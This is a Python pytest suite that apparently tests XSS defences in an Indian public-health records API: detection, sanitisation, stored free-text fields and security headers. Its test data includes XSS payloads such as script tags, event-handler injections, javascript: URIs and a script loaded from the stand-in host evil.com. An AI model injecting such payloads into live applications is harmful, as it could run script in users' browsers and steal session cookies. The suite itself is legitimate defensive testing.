"""Test Suite for TC-SEC-002: Cross-Site Scripting (XSS) Defense.

Specification:
15. Test Cases — Security and Privacy
TC-SEC-002: Cross-site scripting
Priority: P0
Steps:
1. Submit a synthetic script payload in permitted free-text fields.
2. View the resulting data in dashboards.
Expected result: The payload is handled safely and cannot execute as active script in the application.
"""

import pytest
from starlette.testclient import TestClient
from datetime import datetime, timezone
import uuid

from services.api.main import app
from services.store import store, CitizenRecord, UserRecord, ClinicalTriageCase
from packages.types.enums import UserRole, Gender, ClinicianReviewStatus, TriageUrgency
from packages.auth.jwt import create_access_token
from packages.security.xss_guard import (
    XSSDetector,
    XSSSanitizer,
    SafeDOMRenderer,
    XSSViolationError,
)
from packages.clinical_models.triage import SOAPReport

client = TestClient(app)


@pytest.fixture(autouse=True)
def setup_xss_test_context():
    """Ensure baseline test clinician, citizen, and triage case exist."""
    # Seed clinician user
    clinician_user = UserRecord(
        id="user-xss-doctor",
        tenant_id="karnataka_state_health",
        email="xss_doctor@seva.gov.in",
        hashed_password="hashed_pwd",
        role=UserRole.CLINICIAN,
        full_name="Dr. Security Tester",
        assigned_patients=["cit-xss-001"],
    )
    store.add_user(clinician_user)

    # Seed test citizen
    citizen = CitizenRecord(
        id="cit-xss-001",
        tenant_id="karnataka_state_health",
        user_id="user-xss-citizen",
        abha_id="91-9999-8888-7777",
        first_name="Sanjay",
        last_name="Verma",
        birth_date="1985-05-15",
        gender=Gender.MALE,
        phone="+919988776655",
        state="Karnataka",
        district="Mysuru",
        sub_district="Mysuru Urban",
        village_or_ward="Ward 5",
    )
    store.add_citizen(citizen)

    # Seed baseline triage case
    triage = ClinicalTriageCase(
        id="triage-xss-test-01",
        tenant_id="karnataka_state_health",
        citizen_id="cit-xss-001",
        citizen_name="Sanjay Verma",
        risk_assessment_id="risk-xss-001",
        urgency=TriageUrgency.PRIORITY,
        escalation_reason="Initial baseline referral reason",
        soap_note=SOAPReport(
            subjective="Initial check",
            objective="BP 130/85",
            assessment="Prehypertension",
            plan="Observation",
        ),
        status=ClinicianReviewStatus.PENDING,
        created_at=datetime.now(timezone.utc),
    )
    store.add_triage_case(triage)

    yield

    # Clean up
    store.users.pop("user-xss-doctor", None)
    store.citizens.pop("cit-xss-001", None)
    store.triage_cases.pop("triage-xss-test-01", None)


@pytest.fixture
def clinician_auth_headers():
    token = create_access_token(
        subject="user-xss-doctor",
        tenant_id="karnataka_state_health",
        role=UserRole.CLINICIAN,
        scopes=["*"],
    )
    return {"Authorization": f"Bearer {token}"}


# ==============================================================================
# 1. Detection Engine Unit Tests
# ==============================================================================

class TestTCSEC002DetectionEngine:
    """Verifies that synthetic script payloads across all OWASP categories are detected."""

    @pytest.mark.parametrize("payload,expected_category", [
        ("<script>alert('XSS')</script>", "SCRIPT_TAG"),
        ("<sCrIpt SRC='http://evil.com/xss.js'></ScRipT>", "SCRIPT_TAG"),
        ("<img src='x' onerror='alert(document.cookie)'>", "EVENT_HANDLER"),
        ("<svg/onload=alert('SVG_XSS')>", "SVG_MATH_VECTOR"),
        ("<body onload=alert('BODY')>", "EVENT_HANDLER"),
        ("<input onfocus=alert(1) autofocus>", "EVENT_HANDLER"),
        ("<details ontoggle=alert(1) open>", "EVENT_HANDLER"),
        ("javascript:alert('PROTOCOL')", "PSEUDO_PROTOCOL"),
        ("<iframe src='javascript:alert(1)'>", "EMBEDDED_RESOURCE"),
        ("%3Cscript%3Ealert(1)%3C/script%3E", "SCRIPT_TAG"),
    ])
    def test_detector_identifies_synthetic_xss_vectors(self, payload, expected_category):
        is_detected, cat, desc = XSSDetector.inspect(payload, field_name="test_field")
        assert is_detected is True
        assert cat == expected_category
        assert desc is not None

    def test_detector_passes_benign_clinical_text(self):
        benign_notes = [
            "Patient reports BP is < 140 mmHg and feels better after walking.",
            "Normal sinus rhythm > 60 bpm. Medication adherence is 95%.",
            "Refer to Dr. Sharma for cardiology consult. Diet: low sodium, low sugar.",
            "Symptoms: cough < 2 weeks, no fever, SPO2 = 98%.",
        ]
        for note in benign_notes:
            is_detected, cat, desc = XSSDetector.inspect(note, field_name="notes")
            assert is_detected is False
            assert cat is None


# ==============================================================================
# 2. Sanitization & Neutralization Invariant Tests
# ==============================================================================

class TestTCSEC002SanitizationEngine:
    """Verifies that XSSSanitizer neutralizes executable script vectors into inert text."""

    @pytest.mark.parametrize("malicious_input", [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(document.domain)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "Hello <script>stealCookies()</script> Doctor",
        "javascript:alert('link')",
    ])
    def test_sanitizer_produces_inert_output(self, malicious_input):
        sanitized = XSSSanitizer.sanitize_text(malicious_input, encode_entities=True)
        # Sanitized text must be completely inert
        assert XSSSanitizer.is_inert(sanitized) is True
        # Must not contain raw executable '<script' or active 'onerror='
        assert "<script" not in sanitized.lower()
        assert "onerror=" not in sanitized.lower()
        assert "onload=" not in sanitized.lower()

    def test_sanitizer_preserves_clinical_content_safely(self):
        clinical_text = "Fasting glucose > 126 mg/dL & HbA1c > 6.5%. Patient note: 'Feeling fatigued'."
        sanitized = XSSSanitizer.sanitize_text(clinical_text, encode_entities=True)
        # Entity-encoded safely
        assert "&gt;" in sanitized
        assert "&amp;" in sanitized
        assert "Fasting glucose" in sanitized
        assert "fatigued" in sanitized.lower()


# ==============================================================================
# 3. Clinical Free-Text Ingestion Tests (Triage Review & Clinical Notes)
# ==============================================================================

class TestTCSEC002ClinicalIngestion:
    """Verifies that submitting synthetic script payloads into clinical free-text fields

    stores sanitized data and cannot execute as active script when retrieved.
    """

    def test_submit_clinical_review_with_xss_notes(self, clinician_auth_headers):
        xss_payload = "<script>alert('CLINICAL_XSS')</script> Patient advised to reduce salt."
        resp = client.post(
            "/api/v1/clinician/review/triage-xss-test-01",
            headers=clinician_auth_headers,
            json={
                "status": "APPROVED",
                "decision": "APPROVED",
                "review_notes": xss_payload,
                "updated_care_plan_instructions": "<img src=x onerror=alert('CARE_PLAN_XSS')> Daily walk",
            },
        )
        assert resp.status_code == 200
        data = resp.json()

        # Verify stored notes are sanitized
        assert "<script>" not in data["review_notes"]
        assert "Patient advised to reduce salt" in data["review_notes"]

        # Retrieve the case from API to verify dashboard retrieval safety
        get_resp = client.get(
            "/api/v1/clinician/triage/triage-xss-test-01",
            headers=clinician_auth_headers,
        )
        assert get_resp.status_code == 200
        case_data = get_resp.json()
        assert "<script>" not in case_data["review_notes"]
        assert "&lt;script&gt;" in case_data["review_notes"] or "Patient advised" in case_data["review_notes"]

    def test_seed_triage_case_with_xss_escalation_reason(self, clinician_auth_headers):
        xss_reason = "<svg/onload=alert('TRIAGE_REASON')> Critical Systolic Spike 180 mmHg"
        resp = client.post(
            "/api/v1/clinician/triage/seed-demo-case",
            headers=clinician_auth_headers,
            json={
                "citizen_id": "cit-xss-001",
                "rule_type": "SEVERE_HYPERTENSION",
                "custom_reason": xss_reason,
            },
        )
        assert resp.status_code == 200
        case = resp.json()
        assert "<svg" not in case["escalation_reason"]
        assert "Critical Systolic Spike" in case["escalation_reason"]


# ==============================================================================
# 4. Citizen Registry Free-Text Ingestion Tests
# ==============================================================================

class TestTCSEC002CitizenProfileIngestion:
    """Verifies that citizen profile free-text fields sanitize XSS payloads."""

    def test_register_citizen_with_xss_name_and_village(self, clinician_auth_headers):
        xss_name = "<script>alert('CITIZEN_NAME')</script>Ramesh"
        xss_ward = "<img src=x onerror=alert('WARD')>Ward 12"

        resp = client.post(
            "/api/v1/citizens/",
            headers=clinician_auth_headers,
            json={
                "first_name": xss_name,
                "last_name": "Patel",
                "birth_date": "1990-01-01",
                "gender": "MALE",
                "phone": "+919900112233",
                "state": "Karnataka",
                "district": "Mysuru",
                "sub_district": "Mysuru South",
                "village_or_ward": xss_ward,
            },
        )
        assert resp.status_code == 201
        created = resp.json()
        assert "<script>" not in created["first_name"]
        assert "<img" not in created["village_or_ward"]
        assert "Ramesh" in created["first_name"]
        assert "Ward 12" in created["village_or_ward"]


# ==============================================================================
# 5. Content Security Policy (CSP) Response Header Enforcement
# ==============================================================================

class TestTCSEC002CSPHeaderDefense:
    """Verifies that HTTP responses contain active CSP headers preventing script execution."""

    def test_csp_headers_present_on_endpoints(self):
        endpoints = [
            "/health",
            "/api/v1/security/database-integrity",
            "/api/v1/security/xss-audit",
        ]
        for ep in endpoints:
            resp = client.get(ep)
            assert resp.status_code == 200
            headers = resp.headers

            # 1. Content Security Policy
            assert "content-security-policy" in headers
            csp = headers["content-security-policy"]
            assert "object-src 'none'" in csp
            assert "base-uri 'self'" in csp
            assert "frame-ancestors 'none'" in csp

            # 2. XSS Protection
            assert headers.get("x-xss-protection") == "1; mode=block"

            # 3. MIME sniffing defense
            assert headers.get("x-content-type-options") == "nosniff"


# ==============================================================================
# 6. Dedicated Security Endpoints (/api/v1/security/xss-test)
# ==============================================================================

class TestTCSEC002SecurityEndpoints:
    """Verifies the dedicated verification endpoints for automated security auditing."""

    @pytest.mark.parametrize("payload,attack_type", [
        ("<script>alert('TEST_XSS')</script>", "SCRIPT_TAG"),
        ("<img src=x onerror=alert('IMG_XSS')>", "EVENT_HANDLER"),
        ("<svg onload=alert('SVG_XSS')>", "SVG_MATH_VECTOR"),
        ("javascript:alert('JS_SCHEME')", "PSEUDO_PROTOCOL"),
        ("<iframe src='javascript:alert(1)'>", "EMBEDDED_RESOURCE"),
    ])
    def test_security_xss_test_endpoint(self, payload, attack_type):
        resp = client.post(
            "/api/v1/security/xss-test",
            json={
                "payload": payload,
                "attack_type": attack_type,
                "field_name": "clinical_notes",
                "target_dashboard": "clinician_copilot",
            },
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["is_malicious"] is True
        assert data["is_rendered_safe"] is True
        assert data["active_scripts_executable"] is False
        assert data["csp_enforced"] is True
        assert data["incident_logged"] is True
        assert "<script>" not in data["sanitized_text"]

    def test_security_xss_audit_endpoint(self):
        resp = client.get("/api/v1/security/xss-audit")
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "OPERATIONAL"
        assert data["csp_enforced"] is True
        assert data["html_entity_encoding_active"] is True
        assert "total_xss_attempts_blocked" in data
